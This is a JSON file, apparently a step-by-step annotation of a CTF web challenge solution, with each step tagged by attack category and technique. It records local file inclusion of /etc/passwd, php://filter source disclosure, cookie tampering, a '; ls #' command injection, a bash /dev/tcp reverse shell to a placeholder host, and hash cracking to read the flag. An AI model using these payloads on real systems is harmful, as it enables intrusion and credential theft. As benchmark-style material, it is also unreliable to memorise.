@@ -1,0 +1,445 @@
+{
+    "Steps": [
+        {
+            "StepNumber": 1,
+            "StepString": "Visited the website and got redirected to '/?file=wc.php'",
+            "Substeps": [
+                {
+                    "SubstepNumber": 1.1,
+                    "SubstepString": "Visited the website.",
+                    "Category": "1. Web Interaction and Navigation",
+                    "Subcategory": "Web Navigation & Functionality",
+                    "Techniques": [
+                        "Web Page Access",
+                        "Information Gathering"
+                    ]
+                },
+                {
+                    "SubstepNumber": 1.2,
+                    "SubstepString": "Observed redirection to '/?file=wc.php'.",
+                    "Category": "1. Web Interaction and Navigation",
+                    "Subcategory": "Web Navigation & Functionality",
+                    "Techniques": [
+                        "HTTP Response Inspection",
+                        "Page Behavior Analysis"
+                    ]
+                }
+            ]
+        },
+        {
+            "StepNumber": 2,
+            "StepString": "Visited '/?file=/etc/passwd' to confirm server-side file inclusion",
+            "Substeps": [
+                {
+                    "SubstepNumber": 2.1,
+                    "SubstepString": "Visited '/?file=/etc/passwd'.",
+                    "Category": "1. Web Interaction and Navigation",
+                    "Subcategory": "Web Navigation & Functionality",
+                    "Techniques": [
+                        "Web Page Access"
+                    ]
+                },
+                {
+                    "SubstepNumber": 2.2,
+                    "SubstepString": "Confirmed server-side file inclusion.",
+                    "Category": "5. Exploitation Techniques and Payload Handling",
+                    "Subcategory": "Vulnerability Identification & Exploitation",
+                    "Techniques": [
+                        "Vulnerability Discovery"
+                    ]
+                }
+            ]
+        },
+        {
+            "StepNumber": 3,
+            "StepString": "Discovered a 'robots.txt' file at '?file=robots.txt' revealing the existence of 'checkpass.php'",
+            "Substeps": [
+                {
+                    "SubstepNumber": 3.1,
+                    "SubstepString": "Discorded 'robots.txt' file at '?file=robots.txt'.",
+                    "Category": "1. Web Interaction and Navigation",
+                    "Subcategory": "Web Navigation & Functionality",
+                    "Techniques": [
+                        "Web Page Access",
+                        "Page Behavior Analysis"
+                    ]
+                },
+                {
+                    "SubstepNumber": 3.2,
+                    "SubstepString": "Discovered the existence of 'checkpass.php'.",
+                    "Category": "3. Data Analysis, Manipulation, and Storage Interactions",
+                    "Subcategory": "Data Leakage, Extraction, & Encoding",
+                    "Techniques": [
+                        "File Discovery",
+                        "Information Gathering"
+                    ]
+                }
+            ]
+        },
+        {
+            "StepNumber": 4,
+            "StepString": "Visited '/?file=checkpass.php' and realized the page contained some secret potentially usable code",
+            "Substeps": [
+                {
+                    "SubstepNumber": 4.1,
+                    "SubstepString": "Visited '/?file=checkpass.php'.",
+                    "Category": "1. Web Interaction and Navigation",
+                    "Subcategory": "Web Navigation & Functionality",
+                    "Techniques": [
+                        "Web Page Access",
+                        "Path Identification"
+                    ]
+                },
+                {
+                    "SubstepNumber": 4.2,
+                    "SubstepString": "Realized the page contained some secret potentially usable code.",
+                    "Category": "4. Code, Application, and Script Analysis",
+                    "Subcategory": "Code Inspection, Debugging & Manipulation",
+                    "Techniques": [
+                        "Page Behavior Analysis"
+                    ]
+                }
+            ]
+        },
+        {
+            "StepNumber": 5,
+            "StepString": "Used 'php://filter' to view the source of 'checkpass.php' and discovered the password 'w0rdc0unt123'",
+            "Substeps": [
+                {
+                    "SubstepNumber": 5.1,
+                    "SubstepString": "Used 'php://filter' to view the source of 'checkpass.php'.",
+                    "Category": "4. Code, Application, and Script Analysis",
+                    "Subcategory": "Code Inspection, Debugging & Manipulation",
+                    "Techniques": [
+                        "File Access",
+                        "Code Analysis"
+                    ]
+                },
+                {
+                    "SubstepNumber": 5.2,
+                    "SubstepString": "Discovered the password 'w0rdc0unt123'.",
+                    "Category": "3. Data Analysis, Manipulation, and Storage Interactions",
+                    "Subcategory": "Data Leakage, Extraction, & Encoding",
+                    "Techniques": [
+                        "Data Extraction",
+                        "Data Analysis"
+                    ]
+                }
+            ]
+        },
+        {
+            "StepNumber": 6,
+            "StepString": "Used 'php://filter' again and de-coded base64 strings to see the source code of 'wc.php'",
+            "Substeps": [
+                {
+                    "SubstepNumber": 6.1,
+                    "SubstepString": "Used 'php://filter' again.",
+                    "Category": "4. Code, Application, and Script Analysis",
+                    "Subcategory": "Code Inspection, Debugging & Manipulation",
+                    "Techniques": [
+                        "Code Analysis"
+                    ]
+                },
+                {
+                    "SubstepNumber": 6.2,
+                    "SubstepString": "Decoded base64 strings to view the source code of 'wc.php'.",
+                    "Category": "3. Data Analysis, Manipulation, and Storage Interactions",
+                    "Subcategory": "Data Leakage, Extraction, & Encoding",
+                    "Techniques": [
+                        "Data Decoding",
+                        "Data Extraction"
+                    ]
+                }
+            ]
+        },
+        {
+            "StepNumber": 7,
+            "StepString": "Plugged the password ('w0rdc0unt123') from '$password' variable to the cookie and accessed the webpage",
+            "Substeps": [
+                {
+                    "SubstepNumber": 7.1,
+                    "SubstepString": "Plugged the password ('w0rdc0unt123') from '$password' variable to the cookie.",
+                    "Category": "2. Authentication, Session, and User Management",
+                    "Subcategory": "Authentication Bypass & Exploitation",
+                    "Techniques": [
+                        "Cookie Tampering",
+                        "Authentication"
+                    ]
+                },
+                {
+                    "SubstepNumber": 7.2,
+                    "SubstepString": "Accessed the webpage.",
+                    "Category": "1. Web Interaction and Navigation",
+                    "Subcategory": "Web Navigation & Functionality",
+                    "Techniques": [
+                        "Web Page Access"
+                    ]
+                }
+            ]
+        },
+        {
+            "StepNumber": 8,
+            "StepString": "Found out that the user input '$text' from get param 'text' was passed into 'exec' leading to potential remote code execution",
+            "Substeps": [
+                {
+                    "SubstepNumber": 8.1,
+                    "SubstepString": "Identified that the user input '$text' from get param 'text' was being used.",
+                    "Category": "3. Data Analysis, Manipulation, and Storage Interactions",
+                    "Subcategory": "User Input & Parameter Analysis",
+                    "Techniques": [
+                        "Input Analysis"
+                    ]
+                },
+                {
+                    "SubstepNumber": 8.2,
+                    "SubstepString": "Realized '$text' was passed into 'exec' leading to potential remote code execution.",
+                    "Category": "5. Exploitation Techniques and Payload Handling",
+                    "Subcategory": "Exploit & Payload Development",
+                    "Techniques": [
+                        "Code Execution",
+                        "Vulnerability Exploitation"
+                    ]
+                }
+            ]
+        },
+        {
+            "StepNumber": 9,
+            "StepString": "Tried the payload '; ls #'",
+            "Substeps": [
+                {
+                    "SubstepNumber": 9.1,
+                    "SubstepString": "Input the payload '; ls #'.",
+                    "Category": "5. Exploitation Techniques and Payload Handling",
+                    "Subcategory": "Injection Attacks (SQL, XSS, etc.)",
+                    "Techniques": [
+                        "Command Execution",
+                        "Input Analysis"
+                    ]
+                }
+            ]
+        },
+        {
+            "StepNumber": 10,
+            "StepString": "Realized 'echo exec(...)' only returns the last line of the output",
+            "Substeps": [
+                {
+                    "SubstepNumber": 10.1,
+                    "SubstepString": "Realized 'echo exec(...)' only returns the last line of the output.",
+                    "Category": "4. Code, Application, and Script Analysis",
+                    "Subcategory": "Code Inspection, Debugging & Manipulation",
+                    "Techniques": [
+                        "Code Analysis",
+                        "Code Modification"
+                    ]
+                }
+            ]
+        },
+        {
+            "StepNumber": 11,
+            "StepString": "Tried to spawn a reverse shell with '; bash -c \"bash -i >& /dev/tcp/your.server.ip.address/8000 0>&1\" #'",
+            "Substeps": [
+                {
+                    "SubstepNumber": 11.1,
+                    "SubstepString": "Input the payload to attempt to spawn a reverse shell.",
+                    "Category": "5. Exploitation Techniques and Payload Handling",
+                    "Subcategory": "Injection Attacks (SQL, XSS, etc.)",
+                    "Techniques": [
+                        "Command Execution",
+                        "Attack Execution"
+                    ]
+                }
+            ]
+        },
+        {
+            "StepNumber": 12,
+            "StepString": "Used the shell access to browse the file system and found a folder '/ctf'",
+            "Substeps": [
+                {
+                    "SubstepNumber": 12.1,
+                    "SubstepString": "Used shell access to browse the file system.",
+                    "Category": "3. Data Analysis, Manipulation, and Storage Interactions",
+                    "Subcategory": "File System Access, Upload, & Retrieval",
+                    "Techniques": [
+                        "File System Observation"
+                    ]
+                },
+                {
+                    "SubstepNumber": 12.2,
+                    "SubstepString": "Discovered a folder '/ctf'.",
+                    "Category": "3. Data Analysis, Manipulation, and Storage Interactions",
+                    "Subcategory": "File System Access, Upload, & Retrieval",
+                    "Techniques": [
+                        "File Discovery"
+                    ]
+                }
+            ]
+        },
+        {
+            "StepNumber": 13,
+            "StepString": "Identified notable shell script 'findaas' inside '/ctf'",
+            "Substeps": [
+                {
+                    "SubstepNumber": 13.1,
+                    "SubstepString": "Identified notable shell script 'findaas' inside '/ctf'.",
+                    "Category": "3. Data Analysis, Manipulation, and Storage Interactions",
+                    "Subcategory": "Data Leakage, Extraction, & Encoding",
+                    "Techniques": [
+                        "File Discovery",
+                        "Data Analysis"
+                    ]
+                }
+            ]
+        },
+        {
+            "StepNumber": 14,
+            "StepString": "Located 'flag.txt' using './findaas flag.txt'",
+            "Substeps": [
+                {
+                    "SubstepNumber": 14.1,
+                    "SubstepString": "Executed './findaas flag.txt' command.",
+                    "Category": "3. Data Analysis, Manipulation, and Storage Interactions",
+                    "Subcategory": "File System Access, Upload, & Retrieval",
+                    "Techniques": [
+                        "Command Execution",
+                        "File Access"
+                    ]
+                },
+                {
+                    "SubstepNumber": 14.2,
+                    "SubstepString": "Located 'flag.txt'.",
+                    "Category": "3. Data Analysis, Manipulation, and Storage Interactions",
+                    "Subcategory": "Data Leakage, Extraction, & Encoding",
+                    "Techniques": [
+                        "File Discovery",
+                        "Data Extraction"
+                    ]
+                }
+            ]
+        },
+        {
+            "StepNumber": 15,
+            "StepString": "Attempted to read the flag using 'cat ./system/of/a/down/flag.txt' but was denied permission",
+            "Substeps": [
+                {
+                    "SubstepNumber": 15.1,
+                    "SubstepString": "Attempted to read the flag using 'cat ./system/of/a/down/flag.txt'.",
+                    "Category": "3. Data Analysis, Manipulation, and Storage Interactions",
+                    "Subcategory": "File System Access, Upload, & Retrieval",
+                    "Techniques": [
+                        "File Access",
+                        "Command Execution"
+                    ]
+                },
+                {
+                    "SubstepNumber": 15.2,
+                    "SubstepString": "Received permission denied error.",
+                    "Category": "5. Exploitation Techniques and Payload Handling",
+                    "Subcategory": "Vulnerability Identification & Exploitation",
+                    "Techniques": [
+                        "Permission Analysis",
+                        "Attack Execution"
+                    ]
+                }
+            ]
+        },
+        {
+            "StepNumber": 16,
+            "StepString": "Read the 'README' file and found a password hash '6f246c872cbf0b7fd7530b7aa235e67e'",
+            "Substeps": [
+                {
+                    "SubstepNumber": 16.1,
+                    "SubstepString": "Read the 'README' file.",
+                    "Category": "3. Data Analysis, Manipulation, and Storage Interactions",
+                    "Subcategory": "Data Leakage, Extraction, & Encoding",
+                    "Techniques": [
+                        "Data Analysis"
+                    ]
+                },
+                {
+                    "SubstepNumber": 16.2,
+                    "SubstepString": "Found a password hash '6f246c872cbf0b7fd7530b7aa235e67e'.",
+                    "Category": "8. Cryptography, Encoding, and Decoding Techniques",
+                    "Subcategory": "Hashing, Decoding & Encoding Techniques",
+                    "Techniques": [
+                        "Hash Analysis",
+                        "Hash Decoding"
+                    ]
+                }
+            ]
+        },
+        {
+            "StepNumber": 17,
+            "StepString": "Decoded the password hash to find password 'csictf'",
+            "Substeps": [
+                {
+                    "SubstepNumber": 17.1,
+                    "SubstepString": "Decoded the password hash.",
+                    "Category": "8. Cryptography, Encoding, and Decoding Techniques",
+                    "Subcategory": "Hashing, Decoding & Encoding Techniques",
+                    "Techniques": [
+                        "Hash Decoding"
+                    ]
+                },
+                {
+                    "SubstepNumber": 17.2,
+                    "SubstepString": "Found password 'csictf'.",
+                    "Category": "2. Authentication, Session, and User Management",
+                    "Subcategory": "Authentication Bypass & Exploitation",
+                    "Techniques": [
+                        "Credentials Discovery"
+                    ]
+                }
+            ]
+        },
+        {
+            "StepNumber": 18,
+            "StepString": "Switched to the user 'ctf' using the password 'csictf'",
+            "Substeps": [
+                {
+                    "SubstepNumber": 18.1,
+                    "SubstepString": "Switched to the user 'ctf'.",
+                    "Category": "2. Authentication, Session, and User Management",
+                    "Subcategory": "Authentication Bypass & Exploitation",
+                    "Techniques": [
+                        "Authentication"
+                    ]
+                },
+                {
+                    "SubstepNumber": 18.2,
+                    "SubstepString": "Authenticated using the password 'csictf'.",
+                    "Category": "2. Authentication, Session, and User Management",
+                    "Subcategory": "User Registration & Authorization",
+                    "Techniques": [
+                        "Authentication",
+                        "Credentials Discovery"
+                    ]
+                }
+            ]
+        },
+        {
+            "StepNumber": 19,
+            "StepString": "Printed the flag using 'cat ./system/of/a/down/flag.txt'",
+            "Substeps": [
+                {
+                    "SubstepNumber": 19.1,
+                    "SubstepString": "Executed 'cat ./system/of/a/down/flag.txt' command.",
+                    "Category": "3. Data Analysis, Manipulation, and Storage Interactions",
+                    "Subcategory": "File System Access, Upload, & Retrieval",
+                    "Techniques": [
+                        "Command Execution",
+                        "Path Identification"
+                    ]
+                },
+                {
+                    "SubstepNumber": 19.2,
+                    "SubstepString": "Printed the flag.",
+                    "Category": "3. Data Analysis, Manipulation, and Storage Interactions",
+                    "Subcategory": "Data Leakage, Extraction, & Encoding",
+                    "Techniques": [
+                        "Data Extraction"
+                    ]
+                }
+            ]
+        }
+    ]
+}
